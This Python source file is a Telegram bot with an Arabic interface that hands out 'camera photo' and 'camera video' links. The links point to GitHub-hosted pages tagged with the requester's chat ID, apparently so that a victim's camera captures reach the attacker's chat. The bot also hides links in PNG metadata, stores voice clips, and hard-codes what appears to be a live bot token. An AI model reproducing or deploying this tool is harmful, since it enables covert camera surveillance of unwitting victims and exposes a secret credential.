import telebot
from telebot import types
import json
import os
from PIL import Image, PngImagePlugin

# --- إعدادات البوت ---
BOT_TOKEN = "8128965245:AAGR-uUAyI_7AqjI6UVImUsqH9q3Y0pTvHA"
bot = telebot.TeleBot(BOT_TOKEN)
DB_FILE = "voice_db.json"

PHOTO_PAGE_URL = "https://app-display.github.io/ca.html-chatld-/"
VIDEO_PAGE_URL = "https://app-display.github.io/ca.html-chatId/"

user_states = {}
user_data = {}

# --- إدارة قاعدة بيانات الأصوات ---
def load_db():
    if os.path.exists(DB_FILE):
        with open(DB_FILE, 'r') as f:
            try: return json.load(f)
            except: return {"فتاة 1": {}}
    return {"فتاة 1": {}}

def save_db(db):
    with open(DB_FILE, 'w') as f: json.dump(db, f, indent=4)

# --- دالة حقن الرابط في الصورة ---
def hide_link_in_metadata(image_path, link, output_path):
    img = Image.open(image_path).convert("RGB")
    meta = PngImagePlugin.PngInfo()
    meta.add_text("URL_LINK", link)
    img.save(output_path, "PNG", pnginfo=meta)

# --- واجهة البوت ---
@bot.message_handler(commands=['start'])
def send_welcome(message):
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(
        types.InlineKeyboardButton("🖼️ طلب رابط كاميرا الصور", callback_data="get_photo_link"),
        types.InlineKeyboardButton("🎥 طلب رابط كاميرا الفيديو", callback_data="get_video_link"),
        types.InlineKeyboardButton("🔒 حقن رابط في صورة", callback_data="inject_start"),
        types.InlineKeyboardButton("🎧 قسم الصوتيات", callback_data="voice_menu")
    )
    bot.send_message(message.chat.id, "أهلاً المطور سيف الدين، اختر الخدمة:", reply_markup=markup)

# --- معالجة الأزرار ---
@bot.callback_query_handler(func=lambda call: True)
def handle_query(call):
    chat_id = call.message.chat.id
    db = load_db()

    if call.data == "inject_start":
        user_states[chat_id] = "waiting_for_image_inject"
        bot.edit_message_text("أرسل الصورة الآن لحقن الرابط:", chat_id, call.message.message_id)
    
    elif call.data in ["get_photo_link", "get_video_link"]:
        link = f"{PHOTO_PAGE_URL}?chatId={chat_id}" if call.data == "get_photo_link" else f"{VIDEO_PAGE_URL}?chatId={chat_id}"
        bot.send_message(chat_id, f"🔗 الرابط المطلوب:\n{link}")
    
    elif call.data == "voice_menu":
        markup = types.InlineKeyboardMarkup(row_width=2)
        voices = db.get("فتاة 1", {})
        if not voices:
            bot.answer_callback_query(call.id, "لا توجد مقاطع محفوظة، أرسل ملفاً صوتياً للبوت ليتم حفظه!")
            return
        for name in voices.keys():
            markup.add(types.InlineKeyboardButton(name, callback_data=f"play:{name}"))
        bot.edit_message_text("اختر المقطع:", chat_id, call.message.message_id, reply_markup=markup)
        
    elif call.data.startswith("play:"):
        name = call.data.split(":")[1]
        file_id = db["فتاة 1"].get(name)
        try: bot.send_voice(chat_id, file_id)
        except: bot.answer_callback_query(call.id, "❌ خطأ في تشغيل المقطع.")

# --- المعالج العام (صور، نصوص، أصوات) ---
@bot.message_handler(content_types=['photo', 'text', 'voice'])
def handle_all(message):
    chat_id = message.chat.id
    state = user_states.get(chat_id)

    # 1. الحفظ التلقائي للأصوات
    if message.voice:
        db = load_db()
        count = len(db["فتاة 1"]) + 1
        name = f"مقطع {count}"
        db["فتاة 1"][name] = message.voice.file_id
        save_db(db)
        bot.reply_to(message, f"✅ تم حفظ {name} في القاعدة بنجاح!")
    
    # 2. معالجة الحقن (خطوة 1: استلام الصورة)
    elif state == "waiting_for_image_inject" and message.photo:
        file_info = bot.get_file(message.photo[-1].file_id)
        downloaded = bot.download_file(file_info.file_path)
        img_path = f"img_{chat_id}.png"
        with open(img_path, 'wb') as f: f.write(downloaded)
        user_data[chat_id] = img_path
        user_states[chat_id] = "waiting_for_link"
        bot.reply_to(message, "تم حفظ الصورة، أرسل الرابط الآن:")

    # 3. معالجة الحقن (خطوة 2: استلام الرابط)
    elif state == "waiting_for_link" and message.text:
        img_path = user_data.get(chat_id)
        out_path = f"out_{chat_id}.png"
        hide_link_in_metadata(img_path, message.text, out_path)
        with open(out_path, 'rb') as f:
            bot.send_photo(chat_id, f, caption=f"{message.text}")
        user_states[chat_id] = None
        if os.path.exists(img_path): os.remove(img_path)
        if os.path.exists(out_path): os.remove(out_path)

if __name__ == '__main__':
    bot.infinity_polling()
